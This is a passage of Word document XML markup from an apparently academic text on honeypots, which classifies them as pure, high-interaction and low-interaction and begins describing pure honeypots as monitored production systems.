          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>about</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="25"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>cs</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ack</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="26"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>hat co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>mm</w:t>
      </w:r>
      <w:r>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>ge</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:t>fe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>ent</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ne</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>works. B</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>sed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>des</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gn cr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>a,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>can</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>be</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ass</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">as- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Pure honeypo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s    b) h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gh-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>era</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on honeyp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s   c) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ow-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>ac</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>on honeypo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="288" w:lineRule="auto"/>
        <w:ind w:left="100" w:right="70" w:firstLine="710"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>oneypots</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>are</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>fu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ll</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>edged</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>produc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="6"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>ys</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>ac</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>es</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="5"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>tt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>cker</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">are </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>by us</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a casu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ap</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hat</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>has</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>been</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ns</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ll</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>honeypo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>'s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>work. No o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>her</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>sof</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ware</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>needs</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">be </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ns</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>ll</w:t>
      </w:r>
      <w:r>
        <w:t>ed.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>ven</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hough</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="3"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a pure honeypot</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>sef</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ea</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ness</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">he defense </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:t>chan</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>s can</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">be ensured by a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t>e con</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ro</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>echan</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
